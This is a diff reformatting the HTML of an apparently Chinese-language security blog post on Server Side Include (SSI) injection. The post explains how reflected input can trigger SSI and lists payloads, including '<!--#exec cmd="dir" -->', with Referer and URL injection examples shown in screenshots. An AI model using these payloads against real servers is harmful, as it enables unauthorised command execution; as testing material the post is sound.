@@ -85,11 +85,12 @@
                     <div style="padding:5px 5px 2px 0px;">
                         <i class="fa fa-calendar fa-fw"></i>
                         <time>2017-06-08</time>
-                    </div>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
 
                     
 
-                    <div style="padding:2px 5px 5px 0px;">
+                    
                         
                         
                         
@@ -116,24 +117,20 @@
 
 <h3 id="0x00-ssi">0x00 SSI</h3>
 
-<blockquote>
 <p>SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p>
 
 <p>在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞</p>
 
 <p>若注入点在url中则可能需要进行url编码</p>
-</blockquote>
 
 <h3 id="0x01-payload">0x01 payload</h3>
 
-<blockquote>
 <pre><code>&quot;--&gt;'--&gt;`--&gt;&lt;!--#set var=&quot;a&quot; value=&quot;123&quot;--&gt;&lt;!--#set var=&quot;b&quot; value=&quot;654&quot;--&gt;&lt;!--#echo var=&quot;a&quot;--&gt;&lt;!--#echo var=&quot;b&quot;--&gt;
 
 &lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;
 
 &lt;!--#exec cmd=&quot;dir&quot; --&gt;
 </code></pre>
-</blockquote>
 
 <h3 id="0x02-示例">0x02 示例</h3>
 
@@ -141,37 +138,17 @@
 <li>Referer被输出到了页面中</li>
 </ul>
 
-<blockquote>
-<p>
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/ssi_in_referer_request.png" alt="ssi漏洞">
-</div>
+<p><img src="/img/post/ssi_in_referer_request.png" alt="ssi漏洞" /></p>
 
-<br><br>
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/ssi_in_referer_response.png" alt="ssi漏洞">
-</div>
-</p>
-</blockquote>
+<p><img src="/img/post/ssi_in_referer_response.png" alt="ssi漏洞" /></p>
 
 <ul>
 <li>url中的数据被输出到页面中(有时候url中的payload需要url编码)</li>
 </ul>
 
-<blockquote>
-<p>
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/ssi_in_url_request.png" alt="ssi漏洞">
-</div>
+<p><img src="/img/post/ssi_in_url_request.png" alt="ssi漏洞" /></p>
 
-<br><br>
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/ssi_in_url_response.png" alt="ssi漏洞">
-</div>
-</p>
-</blockquote>
+<p><img src="/img/post/ssi_in_url_response.png" alt="ssi漏洞" /></p>
 
                 
                 <div style="padding:10px 1px;">
